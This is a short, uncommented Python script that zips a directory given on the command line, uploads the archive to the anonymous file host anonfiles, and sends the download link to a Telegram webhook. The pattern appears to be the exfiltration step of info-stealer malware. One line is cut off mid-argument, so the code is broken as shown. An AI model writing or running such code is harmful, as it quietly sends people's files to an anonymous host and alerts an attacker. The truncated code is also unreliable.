import shutil, sys, requests

def sendtele(webhookurl, url):
        messaget = webhookurl + 'the link is :' + url
        requests.get(messaget)

def uploadanon(file):
        files = {
                'file': (file, open(file + '.zip', 'rb')),
        }
        url = 'https://api.anonfiles.com/upload'
        response = requests.post(url, files=files)
        data = response.json()
        return data['data']['file']['url']['short']

if __name__ == '__main__':
        shutil.make_archive(sys.argv[2], format='zip', root_dir>
        anonlnk = uploadanon(sys.argv[2])
        sendtele('<webhook-telegram>', anonlnk)
